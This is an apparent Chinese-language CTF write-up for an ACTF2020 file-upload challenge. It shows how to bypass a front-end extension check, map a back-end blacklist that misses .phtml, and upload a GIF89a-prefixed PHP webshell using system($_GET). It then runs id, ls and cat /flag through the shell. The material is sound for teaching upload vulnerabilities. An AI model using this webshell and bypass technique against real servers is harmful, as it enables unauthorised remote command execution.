---
title: "[ACTF2020 新生赛] Upload：黑名单漏掉了 .phtml"
date: 2026-10-24 11:40:00
updated: 2026-10-28 20:30:00
categories:
  - CTF
  - Web
  - 文件上传
tags:
  - 文件上传
  - 后缀绕过
  - .htaccess
  - ACTF
description: 前端校验、后缀黑名单都试过之后，把后缀换成 .phtml 并把 .htaccess 传上去，让服务器认这个后缀，最后拿到 flag。
difficulty: 入门
topic: 文件上传
series: 文件上传
series_order: 1
permalink: 2026/10/24/web-ctf-upload-actf2020/
---


## 观察题目

打开靶机，页面很朴素，只有一个上传表单：

```html
<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
    <input class="input_file" type="file" name="upload_file"/>
    <input class="button" type="submit" name="submit" value="upload"/>
</form>
```

把页面上的线索拆开看：

| 线索 | 值 | 含义 |
| --- | --- | --- |
| `form` 的 `action` | 空 | 提交回 `index.php` 自身处理 |
| 文件字段名 | `upload_file` | 后面构造请求时要用 |
| `onsubmit` | `return checkFile()` | 提交前有一段前端校验 |
| 响应头 | `X-Powered-By: PHP/5.6.40` | PHP 5.x，支持一些 PHP 7 已移除的老式写法 |

## 前端到底拦了什么

看 `js/main.js`：

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = "该文件不允许上传，请上传jpg、png、gif结尾的图片噢！";
        alert(errMsg);
        return false;
    }
}
```

它只做了一件事：**取文件名最后一个点之后的内容，判断是不是 `.jpg` / `.png` / `.gif`。**

也就是说，只要你选的文件叫 `xxx.phtml`，浏览器就会弹窗、表单不提交。但这只是浏览器里的提示。

{% note warning %}
前端只认**最后一个点**后面的内容。`shell.phtml` 会被拦，`shell.jpg` 会放行——代价是服务端真的把文件存成 `.jpg`，永远不会执行。这是我踩过的第一个坑，详见[《文件上传基础》](/2026/10/24/web-knowledge-upload-basics/)里的「我踩过的坑」。
{% endnote %}

## 怎么把 `.phtml` 发出去（不用 Burp）

这是新手最容易卡住的地方：**页面上只有一个按钮，我怎么传别的后缀？**

关键认知：**前端校验和文件最终存成什么后缀，是两件事。** 前者看浏览器里的文件名，后者看 HTTP 请求里的 `filename` 字段。我们要做的是让请求里的 `filename` 保持 `.phtml`，同时让那段 JS 不生效。

{% tabs upload-bypass %}
<!-- tab 方法一 · 禁用 JS @code -->
最简单，也最适合第一次操作。

1. 打开靶机首页，按 `F12` 打开开发者工具；
2. 在 DevTools 里按 `Ctrl+Shift+P` 打开命令面板；
3. 输入 `Disable JavaScript` 并回车；
4. 回到页面按 `F5` 刷新；
5. 选择 `xxx.phtml`，点 upload。

JS 被禁用后，`onsubmit` 里的代码不会执行，表单就是一个普通的 HTML 表单，直接提交。

{% note warning %}
**注意别关掉 F12，一关 JS 就恢复了。**
{% endnote %}
<!-- endtab -->

<!-- tab 方法二 · 覆盖函数 @magic -->
在 Console 里执行：

```javascript
window.checkFile = () => true;
```

然后**不要刷新**，直接选文件上传。`onsubmit` 调用到的就是被替换后的函数。
<!-- endtab -->

<!-- tab 方法三 · 删属性 @wrench -->
F12 → Elements → 找到 `<form ... onsubmit="return checkFile()">`，双击删掉 `onsubmit` 这一段，再点上传。
<!-- endtab -->

<!-- tab 方法四 · 命令行 @terminal -->
完全绕开浏览器：

```bash
curl -F "upload_file=@shell.phtml;type=image/jpeg" \
     -F "submit=upload" \
     "http://<靶机地址>/"
```

`-F` 会把本地文件拼成 `multipart/form-data`，`filename` 自动使用本地文件名，天然带 `.phtml`，完全绕开前端。
<!-- endtab -->
{% endtabs %}

{% note danger %}
**不要用“把文件改名成 .jpg”这种方式过前端。** 因为 `filename` 会跟着变成 `.jpg`，服务端就真的存成 `.jpg` 了——能上传成功，但永远不会执行。**改的是请求，不是文件。**
{% endnote %}

## 摸清后端的黑名单

前端过了，后端还得试。做法是**同一份内容，换不同后缀分别上传**，观察返回：

| 文件名 | 后端返回 | 结果 |
| --- | --- | --- |
| `a.php` | `nonono~ Bad file！` | {% label danger@拦截 %} |
| `a.php5` | `nonono~ Bad file！` | {% label danger@拦截 %} |
| `a.jpg.php` | `nonono~ Bad file！` | {% label danger@拦截 %} |
| `a.phtml` | `Upload Success! Look here~ ./uplo4d/7105...phtml` | {% label success@落盘 %} |
| `a.pht` | 同上 | {% label success@落盘 %} |
| `a.php.jpg` | 同上，但存成 `.jpg` | {% label warning@不可执行 %} |

几条结论：

1. 后端也检查后缀，而且是**黑名单**，明确拦了 `php`、`php5`；
2. 判断方式同样是“取最后一个扩展名”，所以 `a.php.jpg` 会被当成 jpg 放行，存成 `.jpg` 自然没用；
3. 黑名单漏掉了 `phtml` 和 `pht`。

另外，成功回显里直接给出了**存储目录**（`./uplo4d/`，注意是数字 4）和**完整文件名**，省去了爆破路径的功夫。

## 关键一步：哪个后缀会被 PHP 解析

`.phtml` 和 `.pht` 都传上去了，但“能上传”不代表“能执行”。直接访问两个文件对比：

| 后缀 | 响应头 | 响应体 | 是否执行 |
| --- | --- | --- | --- |
| `.phtml` | `Content-Type: text/html` | `GIF89a / PWNED` | {% label success@执行了 %} |
| `.pht` | `Content-Type: image/gif` | `GIF89a` | {% label danger@没执行 %} |

`.phtml` 被执行，说明服务端有 mime 映射。拿到 shell 后可以直接看根因：

```apache
# /var/www/html/.htaccess
<FilesMatch \.phtml$>
    SetHandler application/x-httpd-php
</FilesMatch>
```

这就是本题的题眼：**黑名单只防了 `.php`，而 `.htaccess` 又把 `.phtml` 交给了 PHP 处理。** 两者一叠加，绕过路径就唯一确定了。

{% note info %}
如果题目的 `.htaccess` 里是 `AddHandler` 或 `AddType`，行为会有差别：`AddHandler` 对多后缀文件也生效，`AddType` 只认最后一个扩展名。遇到上传题，一定要把服务器配置（`.htaccess`、`httpd.conf`）当成线索来看。
{% endnote %}

## 构造木马并上传

很多上传点会校验文件头，加一个 `GIF89a` 是零成本的保险，而且完全不影响 PHP 解析——PHP 遇到 `<?php` 之前的非 PHP 文本会原样输出。

```php
GIF89a
<?php system($_GET["c"]); ?>
```

保存为 `shell.phtml`，用 1.3 里的任意一种方式上传，回显：

```text
Upload Success! Look here~ ./uplo4d/79c93a6bf07761fcc2a020e149f3fc60.phtml
```

这里有个有意思的细节：**这个“随机”文件名其实是 `md5(原文件名)`**。验算一下：

```text
md5("shell.phtml") = 79c93a6bf07761fcc2a020e149f3fc60
```

{% note success %}
路径是**可预测**的——就算不回显，也能自己算出来。服务端把用户提交的 `filename` 原样拿去做 md5，这本身也是一个可以记录下来的信息泄露点。
{% endnote %}

## 执行命令，拿 flag

```text
GET /uplo4d/79c93a6bf07761fcc2a020e149f3fc60.phtml?c=id;ls -la /
```

回显：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
-rw-r--r-- 1 root root 43 ... flag
```

Web 根目录里没有 flag，`/flag` 就在根目录下。直接读：

```text
GET ...phtml?c=cat /flag
```

```text
CTF2{a7836b1e-c8a2-4ce8-9678-1081b58f447c}
```

命令执行成功，题目结束。
